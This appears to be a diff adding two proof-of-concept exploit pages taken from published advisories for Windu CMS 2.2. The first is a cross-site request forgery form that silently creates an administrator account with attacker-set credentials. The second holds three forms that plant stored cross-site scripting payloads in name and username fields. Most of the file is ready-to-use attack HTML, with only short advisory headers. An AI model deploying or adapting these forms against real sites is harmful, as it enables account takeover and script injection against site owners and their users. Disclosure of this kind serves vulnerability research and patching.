@@ -1,0 +1,140 @@
+<!--
+
+Windu CMS 2.2 CSRF Add Admin Exploit
+
+
+Vendor: Adam Czajkowski
+Product web page: http://www.windu.org
+Affected version: 2.2 rev 1430
+
+Summary: Windu CMS is a simple, lightweight and fun-to-use
+website content management software.
+
+Desc: Windu CMS suffers from a cross-site request forgery
+vulnerabilities. The application allows users to perform
+certain actions via HTTP requests without performing any
+validity checks to verify the requests. This can be exploited
+to perform certain actions with administrative privileges
+if a logged-in user visits a malicious web site.
+
+User type:
+
+value 17  -  Admin Main    (form_key = addUserSystem)
+value 9   -  Administrator (form_key = addUserSystem)
+value 18  -  Content       (form_key = addUserSystem)
+value 19  -  Editor        (form_key = addUserSystem)
+value 14  -  Page User     (form_key = addUserPage)
+
+
+Tested on: Microsoft Windows 7 Ultimate SP1 (EN)
+           Apache 2.4.2 (Win32)
+           PHP 5.4.7
+           MySQL 5.5.25a
+
+
+
+Vulnerabilities discovered by Gjoko 'LiquidWorm' Krstic
+                              @zeroscience
+
+
+
+Advisory ID: ZSL-2013-5149
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2013-5149.php
+
+
+21.07.2013
+
+-->
+
+
+<html>
+<head>
+<title>Windu CMS 2.2 CSRF Add Admin Exploit</title>
+</head>
+<body><center><br />
+<form method="POST" action="http://localhost/winducms/admin/users/?mn=admin.message.error">
+<input type="hidden" name="type" value="9" />
+<input type="hidden" name="email" value="evil@hacker.net" />
+<input type="hidden" name="password" value="0bl1viON" />
+<input type="hidden" name="passwordCompare" value="0bl1viON" />
+<input type="hidden" name="username" value="hax0r" />
+<input type="hidden" name="name" value="XSRF" />
+<input type="hidden" name="surname" value="PoC" />
+<input type="hidden" name="form_key" value="addUserSystem" />
+<input type="submit" value="Forge!" />
+</form>
+</body>
+</html>
+
+######################################################################
+
+<!--
+
+Windu CMS 2.2 Multiple Persistent Cross-Site Scripting Vulnerabilities
+
+
+Vendor: Adam Czajkowski
+Product web page: http://www.windu.org
+Affected version: 2.2 rev 1430
+
+Summary: Windu CMS is a simple, lightweight and fun-to-use
+website content management software.
+
+Desc: Multiple stored XSS vulnerabilities exist when parsing
+user input to the 'name' and 'username' POST parameters.
+Attackers can exploit these weaknesses to execute arbitrary
+HTML and script code in a user's browser session.
+
+
+Tested on: Microsoft Windows 7 Ultimate SP1 (EN)
+           Apache 2.4.2 (Win32)
+           PHP 5.4.7
+           MySQL 5.5.25a
+
+
+
+Vulnerabilities discovered by Gjoko 'LiquidWorm' Krstic
+                              @zeroscience
+
+
+
+Advisory ID: ZSL-2013-5148
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2013-5148.php
+
+
+21.07.2013
+
+-->
+
+
+<html>
+<head>
+<title>Windu CMS 2.2 Multiple Persistent Cross-Site Scripting Vulnerabilities</title>
+</head>
+<body><center><br />
+<form method="POST" action="http://localhost/winducms/admin/content/edit/659/?mn=admin.message.error">
+<input type="hidden" name="name" value='"><script>alert(1);</script>' />
+<input type="hidden" name="form_key" value="addLang" />
+<input type="submit" value="XSS #1" />
+</form>
+<br />
+<form method="POST" action="http://localhost/winducms/admin/content/add/760/?mn=admin.message.error">
+<input type="hidden" name="name" value='"><script>alert(2);</script>' />
+<input type="hidden" name="type" value="1" />
+<input type="hidden" name="form_key" value="add" />
+<input type="submit" value="XSS #2" />
+</form>
+<br />
+<form method="POST" action="http://localhost/winducms/admin/users/?mn=admin.message.error">
+<input type="hidden" name="type" value="17" />
+<input type="hidden" name="email" value="lab@zeroscience.mk" />
+<input type="hidden" name="password" value="testing...1.2.3" />
+<input type="hidden" name="passwordCompare" value="testing...1.2.3" />
+<input type="hidden" name="username" value='"><script>alert(3);</script>' />
+<input type="hidden" name="name" value="Zero Science Lab" />
+<input type="hidden" name="surname" value="ZSL" />
+<input type="hidden" name="form_key" value="addUserSystem" />
+<input type="submit" value="XSS #3" />
+</form>
+</body>
+</html>
